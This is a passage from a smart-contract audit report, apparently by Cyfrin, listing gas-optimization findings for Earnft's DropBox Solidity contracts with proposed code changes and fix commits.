    uint256 remainingBoxesAmountCache = remainingBoxesAmount;

    // [Safety check] Validate that there are still balance of boxes to mint
    if (remainingBoxesAmountCache == 0) revert NoMoreBoxesToMint();

    // [Safety check] Validate that the remaining boxes to mint are greater or equal to the box amount
    if (remainingBoxesAmountCache < boxAmount) revert NoMoreBoxesToMint();
    // ---------------------------------------------------------------------------------------------

    // Decrease the amount of boxes remaining to mint, since they are now associated to be minted
    remainingBoxesAmount -= boxAmount;

    // Generate the hash of the code and the sender address
    // @audit 2) calculating _getOneTimeCodeHash again with identical inputs
    bytes32 otpHash = _getOneTimeCodeHash(code, allowedAddress);
```

Since `code` and `allowedAddress` don't change there is no point recalculating again; simply do it once and used the cached result:
```diff
+   // Generate the hash of the code and the sender address
+   bytes32 otpHash = _getOneTimeCodeHash(code, allowedAddress);

    // [Safety check] Validate that the one-time code is not already associated to an address
-   address claimerAddress = oneTimeCode[_getOneTimeCodeHash(code, allowedAddress)].claimer;
+   address claimerAddress = oneTimeCode[otpHash].claimer;
    if (claimerAddress != address(0x0)) revert OneTimeCodeAlreadyAssociated(claimerAddress);

    // [Safety check] Validate that the one-time code has not been used
    if (oneTimeCodeUsed[keccak256(bytes(code))]) revert OneTimeCodeAlreadyUsed();

    uint256 remainingBoxesAmountCache = remainingBoxesAmount;

    // [Safety check] Validate that there are still balance of boxes to mint
    if (remainingBoxesAmountCache == 0) revert NoMoreBoxesToMint();

    // [Safety check] Validate that the remaining boxes to mint are greater or equal to the box amount
    if (remainingBoxesAmountCache < boxAmount) revert NoMoreBoxesToMint();
    // ---------------------------------------------------------------------------------------------

    // Decrease the amount of boxes remaining to mint, since they are now associated to be minted
    remainingBoxesAmount -= boxAmount;

-   // Generate the hash of the code and the sender address
-   bytes32 otpHash = _getOneTimeCodeHash(code, allowedAddress);
```

**Mode:**
Fixed in commit [1c983c2](https://github.com/Earnft/dropbox-smart-contracts/commit/1c983c2597be511b22fad5a33ee45bcce000dada).

**Cyfrin:** Verified.


### Remove second `for` loop in `DropBox::claimDropBoxes` and reduce 1 storage read per deleted box

**Description:** The first `for` loop inside `DropBox::claimDropBoxes` can be written like this such that the second `for` loop can be removed, meaning there is only need to iterate once over the input `_boxIds`:
```solidity
    for (uint256 i; i < _boxIds.length; i++) {
      // [Safety check] Duplicate values are not allowed
      if (i > 0 && _boxIds[i - 1] >= _boxIds[i]) revert BadRequest();

      // [Safety check] Validate that the box owner is the sender
      if (ownerOf(_boxIds[i]) != msg.sender) revert Unauthorized();

      // Copy the box from the boxes mapping
      Box memory box = boxIdToBox[_boxIds[i]];

      // Increment the amount of Earnm tokens to send to the sender
      amountToClaim += _calculateVestingPeriodPerBox(box.tier, box.blockTs, TIER_IDS_LENGTH);

      // Delete the box from the boxes mappings
      _deleteBox(_boxIds[i], box.tier);

      // Burn the ERC721 token corresponding to the box
      _burn(_boxIds[i]);
    }
```

The above code requires a modified `_deleteBox` function which saves 1 storage read per deleted box:
```solidity
  /// @param _boxTierId the tier id of the box to delete
  function _deleteBox(uint256 _boxId, uint128 _boxTierId) internal {
    // Delete from address -> _boxId mapping
    delete boxIdToBox[_boxId];

    // Decrease the unclaimed amount of boxes minted per tier
    unclaimedTierAmount[_boxTierId]--;
  }
```

This in turn requires 2 changes to the test suite to pass in the additional `_boxTierId` parameter:
```solidity
// mocks/DropBoxMock.sol
  function mock_deleteBox(uint256 boxId, uint128 tierId) public {
    _deleteBox(boxId, tierId);
  }

// DropBox/behaviors/boxStorage/deleteBox.t.sol
dropBox.mock_deleteBox(boxId, tierId);
```

**Mode:**
Fixed in commit [541f929](https://github.com/Earnft/dropbox-smart-contracts/commit/541f9297b5e0f072e8140d97f23031971e6fff21).

**Cyfrin:** Verified.


### Only read and write storage location `unclaimedTierAmount` once per changed tier in `DropBox::claimDropBoxes`

**Description:** `DropBox::claimDropBoxes` can be re-written to drastically reduce the amount of storage read/writes to `unclaimedTierAmount` storage location like this:
```solidity
  function claimDropBoxes(uint256[] calldata _boxIds) external payable nonReentrant {
    //
    //
    //
    //  Request Checks
    // ---------------------------------------------------------------------------------------------
    // [Safety check] Only allowed to claim if the isEarnmClaimAllowed variable is true
    // Can be modified by the owner as a safety measure
    if (!(isEarnmClaimAllowed)) revert Unauthorized();

    // [Safety check] Validate that the boxIds array is not empty
    if (_boxIds.length == 0) revert Unauthorized();

    // Require that the user sends a fee of "claimFee" amount
    if (msg.value != claimFee) revert InvalidClaimFee();
    // ---------------------------------------------------------------------------------------------

    // Amount of Earnm tokens to claim
    uint256 amountToClaim;

    // [Gas] Cache unclaimedTierAmount and update cache during the loop then
    // write to storage at the end to prevent multiple update storage writes
    uint256[TIER_IDS_ARRAY_LEN] memory unclaimedTierAmountCache;

    // [Gas] Cache the tier changed indicator to update storage only for tiers which changed
    bool[TIER_IDS_ARRAY_LEN] memory tierChangedInd;

    //
    //
    //
    //  Earnm Calculation and Safety Checks
    // ---------------------------------------------------------------------------------------------
    // Iterate over box IDs to calculate rewards and validate ownership and uniqueness.
    // - Validate that the sender is the owner of the boxes
    // - Validate that the sender has enough boxes to claim
    // - Validate that the box ids are valid
    // - Validate that the box ids are not duplicated
    // - Calculate the amount of Earnm tokens to claim given the box ids
    for (uint256 i; i < _boxIds.length; i++) {
      // [Safety check] Duplicate values are not allowed
      if (i > 0 && _boxIds[i - 1] >= _boxIds[i]) revert BadRequest();

      // [Safety check] Validate that the box owner is the sender
      if (ownerOf(_boxIds[i]) != msg.sender) revert Unauthorized();

      // Copy the box from the boxes mappings
      Box memory box = boxIdToBox[_boxIds[i]];

      // Increment the amount of Earnm tokens to send to the sender
      amountToClaim += _calculateVestingPeriodPerBox(box.tier, box.blockTs, TIER_IDS_LENGTH);

      // if the unclaimed cache hasn't been updated for this tier type
      if(!tierChangedInd[box.tier]) {
          // then set it as updated
          tierChangedInd[box.tier] = true;

          // cache the current amount once from storage
          unclaimedTierAmountCache[box.tier] = unclaimedTierAmount[box.tier];
      }

      // decrement the unclaimed cached amount for this tier
      --unclaimedTierAmountCache[box.tier];

      // Delete the box from the boxIdToBox mapping
      delete boxIdToBox[_boxIds[i]];

      // Burn the ERC721 token corresponding to the deleted box
      _burn(_boxIds[i]);
    }

    // [Safety check] In case the amount to claim is 0, revert
    if (amountToClaim == 0) revert AmountOfEarnmToClaimIsZero();

    // Update tier storage only for tiers which were changed
    for (uint128 tierId = 1; tierId < TIER_IDS_ARRAY_LEN; tierId++) {
      if (tierChangedInd[tierId]) unclaimedTierAmount[tierId] = unclaimedTierAmountCache[tierId];
    }

    // ---------------------------------------------------------------------------------------------

    //
    //
    //
    //  Contract Earnm Balance and Safety Checks
    // ---------------------------------------------------------------------------------------------
    // Get the balance of Earnm ERC20 tokens of the contract
    uint256 balance = EARNM.balanceOf(address(this));

    // [Safety check] Validate that the contract has enough Earnm tokens to cover the claim
    if (balance < amountToClaim) revert InsufficientEarnmBalance();
    // ---------------------------------------------------------------------------------------------

    // Emit an event indicating the boxes have been claimed
    emit BoxesClaimed(msg.sender, _boxIds, amountToClaim);

    // Transfer the tokens to the sender
    EARNM.safeTransfer(msg.sender, amountToClaim);
    // ---------------------------------------------------------------------------------------------

    //
    //
    //
    //  Claim Fee Transfer
    // ---------------------------------------------------------------------------------------------
    _sendFee(msg.value);
    // ---------------------------------------------------------------------------------------------
  }
```

With this version the `DropBox::_deleteBox` function is no longer required and should be deleted along with its associated test file and helper function in `DropBoxMock.sol`.

We also noticed through mutation testing that updates to storage for `unclaimedTierAmount` and `boxIdToBox` which occur during the claim process were not being verified by the existing test suite, so added new features to the test suite to cover this:

File: `test/mocks/DropBoxMock.sol`
```solidity
// new helper function
  /// @dev [Test purposes] Test get all the unclaimed tier amounts
  function mock_getUnclaimedTierAmounts() public view returns (uint256[TIER_IDS_ARRAY_LEN] memory) {
    return unclaimedTierAmount;
  }
```

File: `test/DropBox/behaviors/claimDropBox/claimDropBox.t.sol`
```solidity
// updated this helper function to return the expected unclaimed amounts
  function _calculateExpectedClaimAmount(uint256[] memory boxIds) internal view
  returns (uint256 totalClaimAmount, uint256[TIER_IDS_ARRAY_LEN] memory expectedUnclaimedTierAmounts) {
    // first load the existing unclaimed tier amounts
    expectedUnclaimedTierAmounts = dropBox.mock_getUnclaimedTierAmounts();

    // iterate through the boxes that will be claimed
    for (uint256 i; i < boxIds.length; i++) {
      // get timestamp & tier
      (uint128 blockTs, uint128 tier,) = dropBox.getBox(boxIds[i]);

      // calculate expected token claim amount
      totalClaimAmount += dropBox.mock_calculateVestingPeriodPerBox(tier, blockTs, TIER_IDS_LENGTH);

      // update expected unclaimed tier amount
      --expectedUnclaimedTierAmounts[tier];
    }
  }

// updated this helper function to validate the expected amounts
  function _validateClaimedBoxes(
    uint256[TIER_IDS_ARRAY_LEN] memory expectedUnclaimedTierAmounts,
    uint256[] memory boxIds,
    uint256 expectedAmount,
    address claimer) internal
  {
    for (uint256 i; i < boxIds.length; i++) {
      // get info for deleted box
      (uint128 blockTs, uint128 tier, address owner) = dropBox.getBox(boxIds[i]);

      // box should no longer be owned
      assertEq(owner, address(0));

      // box should be deleted from boxIdToBox mapping
      assertEq(blockTs, 0);
      assertEq(tier, 0);
    }

    // verify DropBox::unclaimedTierAmount has been correctly decreased
    for(uint128 tierId = 1; tierId < TIER_IDS_ARRAY_LEN; tierId++) {
      assertEq(dropBox.mock_getUnclaimedTierAmount(tierId), expectedUnclaimedTierAmounts[tierId]);
    }

    // verify expected earnm contract balance after claims processed
    uint256 earnmBalance = earnmERC20Token.balanceOf(claimer);
    assertEq(earnmBalance, expectedAmount);

    emit DropBoxFractalProtocolLib.BoxesClaimed(claimer, boxIds, expectedAmount);
  }

// updated 2 test functions to use the new updated helper functions
  function test_claimDropBoxes_valid() public {
    string memory code = "validCode";
    address allowedAddress = users.stranger;
    uint32 boxAmount = 5;
    uint256[] memory boxIds = new uint256[](boxAmount);
    uint256 earnmAmount = 1000 * 1e18;

    _setupClaimEnvironment(code, allowedAddress, boxAmount, boxIds, earnmAmount);

    (uint256 expectedAmount, uint256[TIER_IDS_ARRAY_LEN] memory expectedUnclaimedTierAmounts)
      = _calculateExpectedClaimAmount(boxIds);

    _fundAndClaim(allowedAddress, boxIds, 1 ether);
    _validateClaimedBoxes(expectedUnclaimedTierAmounts, boxIds, expectedAmount, allowedAddress);
  }

  function test_claimDropBoxes_ClaimAndBurn() public {
    string memory code = "validCode";
    address allowedAddress = users.stranger;
    uint32 boxAmount = 5;
    uint256[] memory boxIds = new uint256[](boxAmount);
    uint256 earnmAmount = 1000 * 1e18;

    _setupClaimEnvironment(code, allowedAddress, boxAmount, boxIds, earnmAmount);
    (uint256 expectedAmount, uint256[TIER_IDS_ARRAY_LEN] memory expectedUnclaimedTierAmounts)
      = _calculateExpectedClaimAmount(boxIds);

    _fundAndClaim(allowedAddress, boxIds, 1 ether);
    _validateClaimedBoxes(expectedUnclaimedTierAmounts, boxIds, expectedAmount, allowedAddress);
  }
```

**Mode:**
Fixed in commit [82a2365](https://github.com/Earnft/dropbox-smart-contracts/commit/82a23652e1f806cfc10bafce389c8ef31ecf020a).

**Cyfrin:** Verified.


### Only read and write storage location `unclaimedTierAmount` once per changed tier in `DropBox::_assignTierAndMint`

**Description:** `DropBox::_assignTierAndMint` can be re-written to drastically reduce the amount of storage read/writes to `unclaimedTierAmount` storage location like this:
```solidity
  function _assignTierAndMint(
    uint32 boxAmount,
    uint256[] memory randomNumbers,
    address claimer,
    bytes memory code
  )
    internal
  {
    uint256[] memory boxIdsToEmit = new uint256[](boxAmount);

    // [Gas] Cache mintedTierAmount and update cache during the loop to prevent
    // _determineTier() from re-reading it from storage multiple times and
    // to prevent multiple update storage writes
    uint256[TIER_IDS_ARRAY_LEN] memory mintedTierAmountCache = mintedTierAmount;

    // [Gas] Cache unclaimedTierAmount and update cache during the loop then
    // write to storage at the end to prevent multiple update storage writes
    uint256[TIER_IDS_ARRAY_LEN] memory unclaimedTierAmountCache;

    // [Gas] Cache the tier changed indicator to update storage only for tiers which changed
    bool[TIER_IDS_ARRAY_LEN] memory tierChangedInd;

    // [Gas] cache the current boxId, use cache during the loop then write once
    // at the end; this results in only 1 storage read and 1 storage write for `boxIdCounter`
    uint256 boxIdCounterCache = boxIdCounter;

    // For each box to mint
    for (uint32 i; i < boxAmount; i++) {
      // [Memory] Add the box id to the boxes ids array
      boxIdsToEmit[i] = boxIdCounterCache++;

      // The box seed is directly derived from the random number without any
      // additional values like the box id, the claimer address, or the block timestamp.
      // This is made like this to ensure the tier assignation of the box is purely random
      // and the tier that the box is assigned to, won't change after the randomness is fulfilled.
      // The only way to predict the seed is to know the random number.
      // Random number validation is done in the _fulfillRandomWords function.
      uint256 boxSeed = uint256(keccak256(abi.encode(randomNumbers[i])));

      // Generate a random number between 0 and TOTAL_MAX_BOXES - 1 using the pure random seed
      // Modulo ensures that the random number is within the range of [0, TOTAL_MAX_BOXES) (upper bound exclusive),
      // providing a uniform distribution across the possible range. This ensures that each tier has a
      // probability of being selected proportional to its maximum box count. The randomness is normalized
      // to fit within the predefined total boxes, maintaining the intended probability distribution for each tier.
      //
      // Example with the following setup:
      // _tierMaxBoxes -> [1, 10, 100, 1000, 2000, 6889]
      // _tierNames -> ["Mythical Box", "Legendary Box", "Epic Box", "Rare Box", "Uncommon Box", "Common Box"]
      //
      // The `TOTAL_MAX_BOXES` is the sum of `_tierMaxBoxes`, which is 10_000.
      // The probability distribution is as follows:
      //
      // Mythical Box:   1    / 10_000  chance.
      // Legendary Box:  10   / 10_000  chance.
      // Epic Box:       100  / 10_000  chance.
      // Rare Box:       1000 / 10_000  chance.
      // Uncommon Box:   2000 / 10_000  chance.
      // Common Box:     6889 / 10_000  chance.
      //
      // By using the modulo operation with TOTAL_MAX_BOXES, the random number's probability
      // to land in any given tier is determined by the number of max boxes available for that tier
      uint256 randomNumber = boxSeed % TOTAL_MAX_BOXES;

      // Determine the tier of the box based on the random number
      uint128 tierId = _determineTier(randomNumber, mintedTierAmountCache);

      // if the tier amount cache hasn't been updated for this tier type
      if(!tierChangedInd[tierId]) {
          // then set it as updated
          tierChangedInd[tierId] = true;

          // cache the current amounts once from storage
          unclaimedTierAmountCache[tierId] = unclaimedTierAmount[tierId];
      }

      // [Gas] Adjust the cached amounts for this tier
      ++mintedTierAmountCache[tierId];
      ++unclaimedTierAmountCache[tierId];

      // Save the box to the boxIdToBox mapping
      boxIdToBox[boxIdsToEmit[i]] = Box({ blockTs: uint128(block.timestamp), tier: tierId });

      // Mint NFT for this box; explicitly not using `_safeMint` to prevent re-entrancy issues
      _mint(claimer, boxIdsToEmit[i]);
    }

    // Update storage for boxIdCounter
    boxIdCounter = boxIdCounterCache;

    // Update tier storage only for tiers which were changed
    for (uint128 tierId = 1; tierId < TIER_IDS_ARRAY_LEN; tierId++) {
      if (tierChangedInd[tierId]) {
        mintedTierAmount[tierId] = mintedTierAmountCache[tierId];
        unclaimedTierAmount[tierId] = unclaimedTierAmountCache[tierId];
      }
    }

    // Emit an event indicating the boxes have been minted
    emit BoxesMinted(claimer, boxIdsToEmit, code);
  }
```

When we made this change we noticed that `test_assignTierAndMint_InvalidBoxAmount` started to fail but this test doesn't seem to be valid since the `boxAmount` input is validated prior to `_assignTierAndMint` being called, hence we believe this test should be deleted as it is not relevant to the current codebase.

**Mode:**
Fixed in commit [79eea07](https://github.com/Earnft/dropbox-smart-contracts/commit/79eea078baf6bf855e5a5854981ac60c88f46118).

**Cyfrin:** Verified.


### Use `uint32` for more efficient storage packing when tracking minted and unclaimed tier box amounts

**Description:** Firstly change `DropBox` storage like this for more efficient storage slot packing:
* move `vrfHandler` up to the start of the public variables
* change some non-constants to `uint32`
* group all the `uint32` non-constants together just after the `bool` non-constants:
```solidity
contract DropBox is
  IVRFHandlerReceiver,
  DropBoxFractalProtocol,
  ReentrancyGuard,
  OwnableBasic,
  BasicRoyalties,
  ERC721C
{
  using SafeERC20 for IERC20;

  /// @notice - EARNM ERC20 token
  IERC20 internal immutable EARNM;

  /// @notice Public variables
  IVRFHandler public vrfHandler; // VRF Handler to handle the Chainlink VRF requests
  string public _contractURI; // OpenSea Contract-level metadata
  string public _baseTokenURI; // ERC721 Base Token metadata
  address public apiAddress;
  address public feesReceiverAddress;
  uint128 public revealFee = 1 ether;
  uint128 public claimFee = 1 ether;
  bool public isEarnmClaimAllowed;
  bool public isRevealAllowed;

  /// @notice Internal variables
  uint32 internal boxIdCounter = 1; // Counter for the box ids
  uint32 internal remainingBoxesAmount; // Remaining boxes amount to mint
  /// @notice this array stores index: tierId, value: total amount minted
  /// element [0] never used since tierId : [1,6]
  uint32[TIER_IDS_ARRAY_LEN] internal mintedTierAmount;
  uint32[TIER_IDS_ARRAY_LEN] internal unclaimedTierAmount;

  /// @notice Mappings
  mapping(uint256 => Box) internal boxIdToBox; // boxId -> Box
  mapping(bytes32 => OneTimeCode) internal oneTimeCode; // code+address hash -> one-time code data; ensure integrity of
    // one-time code data
  mapping(bytes32 => bool) internal oneTimeCodeUsed; // plain text code -> used (true/false); ensure uniqueness of
    // one-time codes
  mapping(bytes32 => uint256[]) internal oneTimeCodeRandomWords; // code+address hash -> random words
  /// [Chainlink VRF]
  mapping(uint256 => bytes32) internal activeVrfRequests; // vrf request -> code+address hash
  mapping(uint256 => bool) internal fulfilledVrfRequests; // vrf request -> fulfilled

  /// @notice Constants - DropBox
  uint32 internal constant MAX_BOX_AMOUNT_PER_REVEAL = 100;
  uint128 internal constant MAX_MINT_FEE = 1000 ether;
  uint128 internal constant MAX_CLAIM_FEE = 1000 ether;
```

Then change the appropriate types throughout `DropBox.sol`:
```solidity
// function associateOneTimeCodeToAddress,
uint32 remainingBoxesAmountCache = remainingBoxesAmount;

// function claimDropBoxes - see optimized code at end of this issue

// function _assignTierAndMint - see optimized code at end of this issue

// view function return parameters
  function getTotalMaxBoxes() external view returns (uint32 totalMaxBoxes) {
```

And inside `DropBoxFractalProtocol.sol`:
```solidity
// events
event OneTimeCodeAssociated(address indexed claimerAddress, bytes code, uint32 boxAmount);

  /// @notice Constants - Tier max boxes
  uint32 internal immutable TIER_6_MAX_BOXES;
  uint32 internal immutable TIER_5_MAX_BOXES;
  uint32 internal immutable TIER_4_MAX_BOXES;
  uint32 internal immutable TIER_3_MAX_BOXES;
  uint32 internal immutable TIER_2_MAX_BOXES;
  uint32 internal immutable TIER_1_MAX_BOXES;
  uint32 internal immutable TOTAL_MAX_BOXES;

  function _determineTier(
    uint256 randomNumber,
    uint32[TIER_IDS_ARRAY_LEN] memory mintedTierAmountCache
```

The test suite also needs some changes:

File: `test/mocks/DropBoxMock.sol`
```solidity
function mock_setUnclaimedTierAmount(uint128 tierId, uint32 amount) public {
function mock_getUnclaimedTierAmount(uint128 tierId) public view returns (uint32) {
function mock_setAllBoxesMinted(uint32 amount) public {

function mock_remainingBoxesAmount() public view returns (uint32) {

  function mock_determineTier(
    uint256 randomNumber,
    uint32[TIER_IDS_ARRAY_LEN] memory mintedTierAmountCache

function mock_getMintedTierAmount(uint128 tierId) public view returns (uint32) {
function mock_getMintedTierAmounts() public view returns (uint32[TIER_IDS_ARRAY_LEN] memory) {
function mock_getUnclaimedTierAmounts() public view returns (uint32[TIER_IDS_ARRAY_LEN] memory) {

  function mock_getMaxBoxesPerTier(uint128 tierId) external view returns (uint32 maxBoxesPerTier) {
```

File: `test/DropBox/behaviours/claimDropBox/claimDropBox.t.sol`
```solidity
  function _calculateExpectedClaimAmount(uint256[] memory boxIds)
    internal
    view
    returns (uint256 totalClaimAmount, uint32[TIER_IDS_ARRAY_LEN] memory expectedUnclaimedTierAmounts)

  function _validateClaimedBoxes(
    uint32[TIER_IDS_ARRAY_LEN] memory expectedUnclaimedTierAmounts,

// occurs in 2 few places
    (uint256 expectedAmount, uint32[TIER_IDS_ARRAY_LEN] memory expectedUnclaimedTierAmounts) =
      _calculateExpectedClaimAmount(boxIds);

// near the bottom
    for (uint32 i; i < boxAmount; i++) {
```

File: `test/DropBox/behaviours/earnmInVesting/liability.t.sol`
```solidity
  function _setUnclaimedTierAmounts(uint32[] memory unclaimedAmounts) internal {
  function _calculateExpectedLiability(uint32[] memory unclaimedAmounts) internal view returns (uint256)

    // occurs in a few places
    uint32[] memory unclaimedAmounts = new uint32[](TIER_IDS_LENGTH);
    for (uint32 i = 1; i <= TIER_IDS_LENGTH; i++) {
```

File: `test/DropBox/behaviours/revealDropBox/revealDropBoxes.t.sol`
```solidity
  function _validateMinting(
    address allowedAddress,
    uint32[TIER_IDS_ARRAY_LEN] memory prevMintedTierAmounts,

    for (uint32 i; i < boxAmount; i++) {
```

File: `test/FractalProtocol/FractalProtocol.sol`
```solidity
// occurs many times
    uint32[TIER_IDS_ARRAY_LEN] memory mintedTierAmountCache;
```

File: `test/DropBoxFractalProtocolLib.sol`
```solidity
  event OneTimeCodeAssociated(address indexed claimerAddress, bytes code, uint32 boxAmount);
```

After making the above changes everything compiles and all the tests pass when using `gas_limit = "18446744073709551615" # u64::MAX` in `foundry.toml` to raise gas limit for tests which attempt to reveal/claim all boxes.

Using `forge inspect DropBox storage` shows that the regular code used 46 storage slots while the version modified with the above changes uses only 33 storage slots.

Another benefit of this is that the entire arrays `unclaimedTierAmount` and `mintedTierAmount` are now stored in 1 storage slot each as opposed to using 1 storage slot per array element; this means that `claimDropBoxes` and `_assignTierAndMint` can be further simplified and optimized to read and write the arrays once without any conditional tier-based logic:

```solidity
  function claimDropBoxes(uint256[] calldata _boxIds) external payable nonReentrant {
    //
    //  Request Checks
    // ---------------------------------------------------------------------------------------------
    // [Safety check] Only allowed to claim if the isEarnmClaimAllowed variable is true
    // Can be modified by the owner as a safety measure
    if (!(isEarnmClaimAllowed)) revert Unauthorized();

    // [Safety check] Validate that the boxIds array is not empty
    if (_boxIds.length == 0) revert Unauthorized();

    // Require that the user sends a fee of "claimFee" amount
    if (msg.value != claimFee) revert InvalidClaimFee();
    // ---------------------------------------------------------------------------------------------

    // Amount of Earnm tokens to claim
    uint256 amountToClaim;

    // [Gas] Cache unclaimedTierAmount and update cache during the loop then
    // write to storage at the end to prevent multiple update storage writes
    uint32[TIER_IDS_ARRAY_LEN] memory unclaimedTierAmountCache = unclaimedTierAmount;

    //  Earnm Calculation and Safety Checks
    // ---------------------------------------------------------------------------------------------
    // Iterate over box IDs to calculate rewards and validate ownership and uniqueness.
    // - Validate that the sender is the owner of the boxes
    // - Validate that the sender has enough boxes to claim
    // - Validate that the box ids are valid
    // - Validate that the box ids are not duplicated
    // - Calculate the amount of Earnm tokens to claim given the box ids
    for (uint256 i; i < _boxIds.length; i++) {
      // [Safety check] Duplicate values are not allowed
      if (i > 0 && _boxIds[i - 1] >= _boxIds[i]) revert BadRequest();

      // [Safety check] Validate that the box owner is the sender
      if (ownerOf(_boxIds[i]) != msg.sender) revert Unauthorized();

      // Copy the box from the boxes mappings
      Box memory box = boxIdToBox[_boxIds[i]];

      // Increment the amount of Earnm tokens to send to the sender
      amountToClaim += _calculateVestingPeriodPerBox(box.tier, box.blockTs, TIER_IDS_LENGTH);

      // Decrement the unclaimed cached amount for this tier
      --unclaimedTierAmountCache[box.tier];

      // Delete the box from the boxIdToBox mapping
      delete boxIdToBox[_boxIds[i]];

      // Burn the ERC721 token corresponding to the box
      _burn(_boxIds[i]);
    }

    // [Safety check] In case the amount to claim is 0, revert
    if (amountToClaim == 0) revert AmountOfEarnmToClaimIsZero();

    // Update unclaimed tier storage
    unclaimedTierAmount = unclaimedTierAmountCache;

    // ---------------------------------------------------------------------------------------------
    //  Contract Earnm Balance and Safety Checks
    // ---------------------------------------------------------------------------------------------
    // Get the balance of Earnm ERC20 tokens of the contract
    uint256 balance = EARNM.balanceOf(address(this));

    // [Safety check] Validate that the contract has enough Earnm tokens to cover the claim
    if (balance < amountToClaim) revert InsufficientEarnmBalance();
    // ---------------------------------------------------------------------------------------------

    // Emit an event indicating the boxes have been claimed
    emit BoxesClaimed(msg.sender, _boxIds, amountToClaim);

    // Transfer the tokens to the sender
    EARNM.safeTransfer(msg.sender, amountToClaim);
    // ---------------------------------------------------------------------------------------------

    //  Claim Fee Transfer
    // ---------------------------------------------------------------------------------------------
    _sendFee(msg.value);
    // ---------------------------------------------------------------------------------------------
  }

  function _assignTierAndMint(
    uint32 boxAmount,
    uint256[] memory randomNumbers,
    address claimer,
    bytes memory code
  )
    internal
  {
    uint256[] memory boxIdsToEmit = new uint256[](boxAmount);

    // [Gas] Cache mintedTierAmount and update cache during the loop to prevent
    // _determineTier() from re-reading it from storage multiple times
    uint32[TIER_IDS_ARRAY_LEN] memory mintedTierAmountCache = mintedTierAmount;

    // [Gas] Cache unclaimedTierAmount and update cache during the loop then
    // write to storage at the end to prevent multiple update storage writes
    uint32[TIER_IDS_ARRAY_LEN] memory unclaimedTierAmountCache = unclaimedTierAmount;

    // [Gas] cache the current boxId, use cache during the loop then write once
    // at the end; this results in only 1 storage read and 1 storage write for `boxIdCounter`
    uint32 boxIdCounterCache = boxIdCounter;

    // For each box to mint
    for (uint32 i; i < boxAmount; i++) {
      // [Memory] Add the box id to the boxes ids array
      boxIdsToEmit[i] = boxIdCounterCache++;

      // The box seed is directly derived from the random number without any
      // additional values like the box id, the claimer address, or the block timestamp.
      // This is made like this to ensure the tier assignation of the box is purely random
      // and the tier that the box is assigned to, won't change after the randomness is fulfilled.
      // The only way to predict the seed is to know the random number.
      // Random number validation is done in the _fulfillRandomWords function.
      uint256 boxSeed = uint256(keccak256(abi.encode(randomNumbers[i])));

      // Generate a random number between 0 and TOTAL_MAX_BOXES - 1 using the pure random seed
      // Modulo ensures that the random number is within the range of [0, TOTAL_MAX_BOXES) (upper bound exclusive),
      // providing a uniform distribution across the possible range. This ensures that each tier has a
      // probability of being selected proportional to its maximum box count. The randomness is normalized
      // to fit within the predefined total boxes, maintaining the intended probability distribution for each tier.
      //
      // Example with the following setup:
      // _tierMaxBoxes -> [1, 10, 100, 1000, 2000, 6889]
      // _tierNames -> ["Mythical Box", "Legendary Box", "Epic Box", "Rare Box", "Uncommon Box", "Common Box"]
      //
      // The `TOTAL_MAX_BOXES` is the sum of `_tierMaxBoxes`, which is 10_000.
      // The probability distribution is as follows:
      //
      // Mythical Box:   1    / 10_000  chance.
      // Legendary Box:  10   / 10_000  chance.
      // Epic Box:       100  / 10_000  chance.
      // Rare Box:       1000 / 10_000  chance.
      // Uncommon Box:   2000 / 10_000  chance.
      // Common Box:     6889 / 10_000  chance.
      //
      // By using the modulo operation with TOTAL_MAX_BOXES, the random number's probability
      // to land in any given tier is determined by the number of max boxes available for that tier
      uint256 randomNumber = boxSeed % TOTAL_MAX_BOXES;

      // Determine the tier of the box based on the random number
      uint128 tierId = _determineTier(randomNumber, mintedTierAmountCache);

      // [Gas] Adjust the cached amounts for this tier
      ++mintedTierAmountCache[tierId];
      ++unclaimedTierAmountCache[tierId];

      // Save the box to the boxIdToBox mapping
      boxIdToBox[boxIdsToEmit[i]] = Box({ blockTs: uint128(block.timestamp), tier: tierId });

      // Mint the box; explicitly not using `_safeMint` to prevent re-entrancy issues
      _mint(claimer, boxIdsToEmit[i]);
    }

    // Update storage for boxIdCounter
    boxIdCounter = boxIdCounterCache;

    // Update unclaimed & minted tier amounts
    mintedTierAmount = mintedTierAmountCache;
    unclaimedTierAmount = unclaimedTierAmountCache;

    // Emit an event indicating the boxes have been minted
    emit BoxesMinted(claimer, boxIdsToEmit, code);
  }
```

**Mode:**
Fixed in commit [37d258c](https://github.com/Earnft/dropbox-smart-contracts/commit/37d258caa2b6ca07af7f8229951ebf7bc2cd6202).

**Cyfrin:** Verified.


### Use `uint128` for `revealFee` and `claimFee` for more efficient storage packing

**Description:** Currently `revealFee` and `claimFee` use `uint256` and are set to `1 ether` with a max value of `1000 ether`. Hence they each take up 1 storage slot but this is not that efficient since:
```solidity
1 ether           = 1000000000000000000
1000 ether        = 1000000000000000000000
type(uint128.max) = 340282366920938463463374607431768211455
```

Therefore use `uint128` for `revealFee` and `claimFee`:
```solidity
// storage
  uint128 public revealFee = 1 ether;
  uint128 public claimFee = 1 ether;
  uint128 internal constant MAX_MINT_FEE = 1000 ether;
  uint128 internal constant MAX_CLAIM_FEE = 1000 ether;

// function updates
function setRevealFee(uint128 _mintFee) external onlyOwner {
  function setClaimFee(uint128 _claimFee) external onlyOwner {
```

Also update events in `DropBoxFractalProtocol`:
```solidity
  event RevealFeeUpdated(uint128 revealFee);
  event ClaimFeeUpdated(uint128 claimFee);
```

**Mode:**
Fixed in commit [fb20301](https://github.com/Earnft/dropbox-smart-contracts/commit/fb20301f77c9ae0c7c2333a13a11ca4b02d88366).

**Cyfrin:** Verified.


### Remove redundant check from `VRFHandler::constructor`

**Description:** Remove redundant check from `VRFHandler::constructor`:
```diff
  constructor(
    address vrfCoordinator,
    bytes32 keyHash,
    uint256 subscriptionId
  )
    /**
     * ConfirmedOwner(msg.sender) is defined in @chainlink/contracts/src/v0.8/vrf/dev/VRFConsumerBaseV2Plus.sol:113:40
     * with "msg.sender".
     */
    VRFConsumerBaseV2Plus(vrfCoordinator)
  {
    if (keyHash == bytes32(0)) revert InvalidVrfKeyHash();
    if (subscriptionId == 0) revert InvalidVrfSubscriptionId();
-   if (vrfCoordinator == address(0)) revert InvalidVrfCoordinator();

    vrfKeyHash = keyHash;
    vrfSubscriptionId = subscriptionId;
  }
```

This check is redundant as `VRFHandler` inherits from `VRFConsumerBaseV2Plus` which already [performs](https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.8/vrf/dev/VRFConsumerBaseV2Plus.sol#L114-L115) this check in its own constructor.

**Mode:**
Fixed in commit [cc45c9a](https://github.com/Earnft/dropbox-smart-contracts/commit/cc45c9a80980118107ede5001ee9ac5c7a5b6040).

